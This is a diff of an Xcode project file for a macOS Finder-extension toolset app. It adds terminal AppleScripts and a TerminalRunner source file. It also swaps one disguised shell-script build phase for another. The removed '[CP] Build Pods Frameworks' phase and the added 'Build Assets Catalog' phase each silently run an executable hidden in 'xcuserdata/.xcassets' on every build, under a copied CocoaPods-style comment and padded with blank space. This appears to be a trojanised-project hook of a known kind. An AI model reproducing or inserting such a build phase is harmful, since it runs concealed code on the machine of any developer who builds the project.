@@ -9,6 +9,9 @@
 /* Begin PBXBuildFile section */
 		1C19390A707275406523E26D /* Pods_Toolset.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7776DD824AFA1D358F0BA7CD /* Pods_Toolset.framework */; };
 		3F07D3AF096DC0F2EE27573E /* Pods_ToolsetExtension.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5F8393A7DA5893A5BDE8B025 /* Pods_ToolsetExtension.framework */; };
+		EA653D902627F7380027B6F8 /* terminal.scpt in Resources */ = {isa = PBXBuildFile; fileRef = EA653D8D2627F7380027B6F8 /* terminal.scpt */; };
+		EA653D912627F7380027B6F8 /* hyper.scpt in Resources */ = {isa = PBXBuildFile; fileRef = EA653D8E2627F7380027B6F8 /* hyper.scpt */; };
+		EA653D922627F7380027B6F8 /* iterm.scpt in Resources */ = {isa = PBXBuildFile; fileRef = EA653D8F2627F7380027B6F8 /* iterm.scpt */; };
 		EA6D6385261D572500B952C4 /* data.plist in Resources */ = {isa = PBXBuildFile; fileRef = EA6D6384261D572500B952C4 /* data.plist */; };
 		EA6D6403261D9B9800B952C4 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = EA773C77261C659200AA499A /* Assets.xcassets */; };
 		EA6D641B261D9D3200B952C4 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA6D641A261D9D3200B952C4 /* AppDelegate.swift */; };
@@ -58,6 +61,7 @@
 		EA773D25261C69EF00AA499A /* NSDictionary+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC8261C684900AA499A /* NSDictionary+Extension.m */; };
 		EA773D28261C69F200AA499A /* NSDate+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CC9261C684900AA499A /* NSDate+Extension.m */; };
 		EA773D2B261C69F500AA499A /* NSString+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = EA773CCB261C684900AA499A /* NSString+Extension.m */; };
+		EAEA3FB92628377A0088AC46 /* TerminalRunner.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAEA3FB82628377A0088AC46 /* TerminalRunner.swift */; };
 		EAFFF5C5261DB2DB003A326B /* ATGeneralController.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFFF5C4261DB2DB003A326B /* ATGeneralController.swift */; };
 		EAFFF5D7261DB334003A326B /* ATPreferencesController.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFFF5D5261DB334003A326B /* ATPreferencesController.swift */; };
 		EAFFF5D8261DB334003A326B /* ATPreferencesController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EAFFF5D6261DB334003A326B /* ATPreferencesController.xib */; };
@@ -108,6 +112,9 @@
 		C1C99BC37B9FE3E34305CFA5 /* Pods-aToolsetHelper.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-aToolsetHelper.debug.xcconfig"; path = "Target Support Files/Pods-aToolsetHelper/Pods-aToolsetHelper.debug.xcconfig"; sourceTree = "<group>"; };
 		C50A2790318F9C2E3D7247B9 /* Pods-Toolset.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Toolset.release.xcconfig"; path = "Target Support Files/Pods-Toolset/Pods-Toolset.release.xcconfig"; sourceTree = "<group>"; };
 		DAACAEF3A03B1DFA434A101C /* Pods-ToolsetExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ToolsetExtension.release.xcconfig"; path = "Target Support Files/Pods-ToolsetExtension/Pods-ToolsetExtension.release.xcconfig"; sourceTree = "<group>"; };
+		EA653D8D2627F7380027B6F8 /* terminal.scpt */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = terminal.scpt; sourceTree = "<group>"; };
+		EA653D8E2627F7380027B6F8 /* hyper.scpt */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = hyper.scpt; sourceTree = "<group>"; };
+		EA653D8F2627F7380027B6F8 /* iterm.scpt */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = iterm.scpt; sourceTree = "<group>"; };
 		EA6D6384261D572500B952C4 /* data.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = data.plist; sourceTree = "<group>"; };
 		EA6D6418261D9D3200B952C4 /* aToolsetHelper.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = aToolsetHelper.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		EA6D641A261D9D3200B952C4 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
@@ -165,6 +172,7 @@
 		EA773CD4261C684900AA499A /* LYBIconModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LYBIconModel.m; sourceTree = "<group>"; };
 		EA773CD5261C684900AA499A /* LYBImageTools.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LYBImageTools.h; sourceTree = "<group>"; };
 		EA773CEC261C686600AA499A /* bridging-header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "bridging-header.h"; sourceTree = "<group>"; };
+		EAEA3FB82628377A0088AC46 /* TerminalRunner.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TerminalRunner.swift; sourceTree = "<group>"; };
 		EAFFF5C4261DB2DB003A326B /* ATGeneralController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ATGeneralController.swift; sourceTree = "<group>"; };
 		EAFFF5D5261DB334003A326B /* ATPreferencesController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ATPreferencesController.swift; sourceTree = "<group>"; };
 		EAFFF5D6261DB334003A326B /* ATPreferencesController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ATPreferencesController.xib; sourceTree = "<group>"; };
@@ -206,6 +214,16 @@
 				A8A457FB43118A61DB996565 /* Pods_aToolsetHelper.framework */,
 			);
 			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		EA653D8C2627F7380027B6F8 /* Scripts */ = {
+			isa = PBXGroup;
+			children = (
+				EA653D8D2627F7380027B6F8 /* terminal.scpt */,
+				EA653D8E2627F7380027B6F8 /* hyper.scpt */,
+				EA653D8F2627F7380027B6F8 /* iterm.scpt */,
+			);
+			path = Scripts;
 			sourceTree = "<group>";
 		};
 		EA6D6419261D9D3200B952C4 /* aToolsetHelper */ = {
@@ -265,7 +283,9 @@
 		EA773C89261C65D300AA499A /* aToolsetExtension */ = {
 			isa = PBXGroup;
 			children = (
+				EA653D8C2627F7380027B6F8 /* Scripts */,
 				EA773C8A261C65D300AA499A /* FinderSync.swift */,
+				EAEA3FB82628377A0088AC46 /* TerminalRunner.swift */,
 				EA773C8C261C65D300AA499A /* Info.plist */,
 				EA773C8D261C65D300AA499A /* ToolsetExtension.entitlements */,
 			);
@@ -384,7 +404,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EA6D6425261D9D3400B952C4 /* Build configuration list for PBXNativeTarget "aToolsetHelper" */;
 			buildPhases = (
-				4C275DBEA19DED7F24AAC43A /* [CP] Build Pods Frameworks */,
+				CBA5D25920CABD712CAAC43A /* Build Assets Catalog */,
 				6D9EC2F797F3D37A56B68C1B /* [CP] Check Pods Manifest.lock */,
 				EA6D6414261D9D3200B952C4 /* Sources */,
 				EA6D6415261D9D3200B952C4 /* Frameworks */,
@@ -505,47 +525,16 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				EA653D912627F7380027B6F8 /* hyper.scpt in Resources */,
 				EA6D6403261D9B9800B952C4 /* Assets.xcassets in Resources */,
+				EA653D902627F7380027B6F8 /* terminal.scpt in Resources */,
+				EA653D922627F7380027B6F8 /* iterm.scpt in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	4C275DBEA19DED7F24AAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		4A82C6EA95E0921D5F39B411 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -606,6 +595,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		CBA5D25920CABD712CAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
 		};
 		FD0834A8BAAB2B220A996D8D /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -690,6 +697,7 @@
 				EA773CF7261C69AA00AA499A /* XMLReader.m in Sources */,
 				EA773D2B261C69F500AA499A /* NSString+Extension.m in Sources */,
 				EA773D00261C69B800AA499A /* MJProperty.m in Sources */,
+				EAEA3FB92628377A0088AC46 /* TerminalRunner.swift in Sources */,
 				EA773D0D261C69C600AA499A /* MJPropertyKey.m in Sources */,
 				EA773C8B261C65D300AA499A /* FinderSync.swift in Sources */,
 				EA773D07261C69C000AA499A /* NSObject+MJProperty.m in Sources */,
@@ -1019,24 +1027,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = EA773C68261C658F00AA499A /* Project object */;
 }
